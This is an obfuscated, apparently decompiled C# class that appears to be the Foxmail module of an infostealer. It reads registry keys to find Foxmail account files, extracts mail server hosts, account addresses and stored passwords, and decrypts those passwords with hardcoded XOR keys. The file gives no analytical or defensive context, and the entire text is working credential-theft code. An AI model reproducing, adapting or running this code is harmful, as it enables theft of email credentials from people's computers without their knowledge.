using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.Win32;
using p3N5Y;

namespace ZAZUx;

public class UYg : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string rPMWkScgQc
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public UYg()
	{
		rPMWkScgQc = "FoxMail";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			switch (num)
			{
			case 2:
				try
				{
					string path = (string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Aerofox\\FoxmailPreview", "Executable", null);
					string directoryName = Path.GetDirectoryName(path);
					string path2 = (string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Aerofox\\Foxmail\\V3.1", "FoxmailPath", null);
					string directoryName2 = Path.GetDirectoryName(path2);
					List<string> list2 = new List<string>();
					List<string> list3 = new List<string>();
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
					if (Directory.Exists(directoryName + "\\Storage\\"))
					{
						list2.AddRange(Directory.GetDirectories(directoryName + "\\Storage\\"));
					}
					if (Directory.Exists(directoryName2 + "\\mail"))
					{
						list3.AddRange(Directory.GetDirectories(directoryName2 + "\\mail"));
					}
					if (Directory.Exists(folderPath + "\\VirtualStore\\Program Files\\Foxmail\\mail"))
					{
						list3.AddRange(Directory.GetDirectories(folderPath + "\\VirtualStore\\Program Files\\Foxmail\\mail"));
					}
					if (Directory.Exists(folderPath + "\\VirtualStore\\Program Files (x86)\\Foxmail\\mail"))
					{
						list3.AddRange(Directory.GetDirectories(folderPath + "\\VirtualStore\\Program Files (x86)\\Foxmail\\mail"));
					}
					if (list2.Count + list3.Count < 1)
					{
						return list;
					}
					List<string> list4 = new List<string>();
					foreach (string item in list2)
					{
						if (File.Exists(item + "\\Accounts\\Account.rec0"))
						{
							list4.Add(item + "\\Accounts\\Account.rec0");
						}
					}
					foreach (string item2 in list3)
					{
						if (File.Exists(item2 + "\\Account.stg"))
						{
							list4.Add(item2 + "\\Account.stg");
						}
					}
					new Random();
					foreach (string item3 in list4)
					{
						FileStream fileStream = new FileStream(item3, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						int num2 = Convert.ToInt32(fileStream.Length);
						byte[] array = new byte[num2 - 1 + 1];
						bool flag = false;
						bool flag2 = false;
						string text = "";
						int num3 = 0;
						ii68 ii69 = new ii68();
						fileStream.Read(array, 0, num2);
						fileStream.Close();
						fileStream.Dispose();
						num3 = ((array[0] != 208) ? 1 : 0);
						for (int i = 0; i <= num2 - 1; i++)
						{
							if (array[i] > 32 && array[i] < 127 && array[i] != 61)
							{
								text += (char)array[i];
								if (text.Equals("POP3Host") || text.Equals("SMTPHost") || text.Equals("IncomingServer"))
								{
									int j = i + 9;
									if (num3 == 0)
									{
										j = i + 2;
									}
									for (; array[j] > 32 && array[j] < 127; j++)
									{
										ii69.byIdLuuGZbL += (char)array[j];
									}
									flag2 = true;
									i = j;
								}
								else if (text.Equals("Account") || text.Equals("MailAddress"))
								{
									int k = i + 9;
									if (num3 == 0)
									{
										k = i + 2;
									}
									for (; array[k] > 32 && array[k] < 127; k++)
									{
										ii69.S8v += (char)array[k];
									}
									flag = true;
									i = k;
								}
								else
								{
									if (!flag || !flag2 || (!text.Equals("Password") && !text.Equals("POP3Password")))
									{
										continue;
									}
									int l = i + 9;
									if (num3 == 0)
									{
										l = i + 2;
									}
									string text2 = "";
									for (; array[l] > 32 && array[l] < 127; l++)
									{
										text2 += (char)array[l];
									}
									if (text2 != "")
									{
										ii69._9H5rP7hg2 = X4vp(num3, text2);
									}
									else
									{
										ii69._9H5rP7hg2 = "";
									}
									bool flag3 = false;
									foreach (ii68 item4 in list)
									{
										if (item4.S8v.Equals(ii69.S8v) && item4._9H5rP7hg2.Equals(ii69._9H5rP7hg2))
										{
											flag3 = true;
											break;
										}
									}
									if (!flag3)
									{
										ii69.oVAe = rPMWkScgQc;
										list.Add(ii69);
										flag3 = false;
									}
									ii69 = new ii68();
									flag2 = false;
									flag = false;
									i = l;
								}
							}
							else
							{
								text = "";
							}
						}
					}
				}
				catch
				{
				}
				return list;
			case 0:
				num = 1;
				break;
			}
		}
		while (num != 3);
		List<ii68> result = default;
		return result;
	}

	private static string X4vp(int _86jyDtq, string SXeKACLR)
	{
		int num = 0;
		string text = default;
		do
		{
			if (num == 1)
			{
				text = "";
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
		try
		{
			int[] array = new int[8] { 126, 100, 114, 97, 71, 111, 110, 126 };
			int[] array2 = new int[8] { 126, 70, 64, 55, 37, 109, 36, 126 };
			int num2 = Convert.ToInt32("5A", 16);
			if (_86jyDtq == 1)
			{
				array = null;
				array = array2;
				array2 = null;
				num2 = Convert.ToInt32("71", 16);
			}
			int num3 = SXeKACLR.Length / 2;
			int num4 = 0;
			int[] array3 = new int[num3 - 1 + 1];
			for (int i = 0; i <= num3 - 1; i++)
			{
				array3[i] = Convert.ToInt32(SXeKACLR.Substring(num4, 2), 16);
				num4 += 2;
			}
			int[] array4 = new int[array3.Length];
			array4[0] = array3[0] ^ num2;
			Array.Copy(array3, 1, array4, 1, array3.Length - 1);
			while (array3.Length > array.Length)
			{
				int[] array5 = new int[array.Length * 2];
				Array.Copy(array, 0, array5, 0, array.Length);
				Array.Copy(array, 0, array5, array.Length, array.Length);
				array = null;
				array = array5;
				array5 = null;
			}
			int[] array6 = new int[array3.Length];
			for (int j = 1; j < array3.Length; j++)
			{
				array6[j - 1] = array3[j] ^ array[j - 1];
			}
			int[] array7 = new int[array6.Length];
			for (int k = 0; k < array6.Length - 1; k++)
			{
				if (array6[k] - array4[k] < 0)
				{
					array7[k] = array6[k] + 255 - array4[k];
				}
				else
				{
					array7[k] = array6[k] - array4[k];
				}
				text += (char)array7[k];
			}
		}
		catch
		{
		}
		return text;
	}
}
